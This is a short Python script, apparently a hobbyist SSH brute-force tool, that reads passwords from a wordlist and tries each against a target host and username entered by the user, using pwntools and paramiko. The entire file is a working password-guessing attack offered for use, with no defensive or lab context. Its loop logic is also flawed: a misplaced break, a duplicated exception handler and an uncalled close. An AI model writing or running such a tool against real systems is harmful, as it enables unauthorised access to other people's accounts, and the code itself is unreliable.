from pwn import *
import paramiko


print("WELCOME TO HACKNISTRATOR SSH BRUTE-FORCE BAZUKA")



host = input("Enter target ip address: ")
username = input("Enter target Username:  ")
attempt = 1


with open("wordlist.txt", "r") as  pass_list:
    for passwords in pass_list:
        passwords=passwords.strip("\n")
        try:
            ...
            print("[{}] Attempting password '{}'".format(attempt,passwords))
            res=ssh(host=host,user=username,password=passwords,timeout=1)
            if res.connected():
                print("[+]Valid password found successfully '{}'".format(passwords))
                res.close()
            break
            res.close
        except paramiko.ssh_exception.AuthenticationException:
            print("[X]No Valid Password Found")
            attempt+=1
        except paramiko.ssh_exception.AuthenticationException:
             print("[!] Authentication failed.")
             print("Reason: The username or password is incorrect.")

        except paramiko.ssh_exception.SSHException as e:
            print("[!] SSH protocol error.")
            print(f"Reason: {e}")

        except TimeoutError:
                print("[!] Connection timed out.")
                print("Reason: The server did not respond in time.")

        except OSError as e:
            print("[!] Network error.")
            print(f"Reason: {e}")

        except Exception as e:
            print("[!] Unexpected error.")
            print(f"Reason: {e}")